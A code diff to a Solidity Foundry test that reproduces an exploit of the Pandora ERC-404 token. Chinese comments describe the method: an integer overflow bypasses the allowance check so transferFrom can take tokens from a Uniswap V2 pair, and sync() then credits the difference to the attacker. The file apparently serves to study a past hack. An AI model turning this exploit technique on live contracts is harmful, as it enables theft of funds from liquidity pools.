@@ -36,6 +36,8 @@ contract ContractTest is Test {
         console.log("contract address is :", address(this));
         emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
         emit log_named_decimal_uint("[Begin] Attacker pandora before exploit", PANDORA.balanceOf(address(this)), 18);
+        bytes memory bytecodeWithPandora = vm.getDeployedCode("pandorasblock404.sol:PandorasNodes404");
+        vm.etch(address(PANDORA), bytecodeWithPandora);
 
         uint256 pandora_balance = PANDORA.balanceOf(address(V2_PAIR));
 
@@ -43,9 +45,16 @@ contract ContractTest is Test {
         // 第一次发生transferFrom之后，pair中pandora_balance减少，但是pandora_reserve不变，所以调用sync函数使得二者强行匹配
         // 第二次transferFrom发生之后，pair中pandora_balance增加，pandora_reserve不变，所以增加的这部分(pandora_balance - pandora_reserve)算在了攻击者头上，则获利
 
-        // 发生整数移除，使得msg.sender无需授权，即可使以下函数调用通过allowance检查
-        console.log("Before first transferFrom, pandora token amounts:",PANDORA.balanceOf(address(this)));
-        PANDORA.transferFrom(address(V2_PAIR), address(PANDORA), pandora_balance - 1);
+        // 发生整数溢出，使得msg.sender无需授权，即可使以下函数调用通过allowance检查
+        console.log("Before first transferFrom, pandora token amounts:", PANDORA.balanceOf(address(this)));
+        // uint256 minted = PANDORA.minted();
+        // console.log("Now minted is :", minted);
+        // uint256 allowed = PANDORA.allowance(address(V2_PAIR), address(this));
+        // console.log("allowance is :", allowed);
+        // PANDORA.transferFrom(address(V2_PAIR), address(PANDORA), pandora_balance);
+        PANDORA.transferFrom(address(V2_PAIR), address(this), 214);
+        console.log("After first transferFrom, pandora token amounts:", PANDORA.balanceOf(address(this)));
+
         V2_PAIR.sync();
         (uint256 ethReserve, uint256 oldPANDORAReserve, ) = V2_PAIR.getReserves();
 
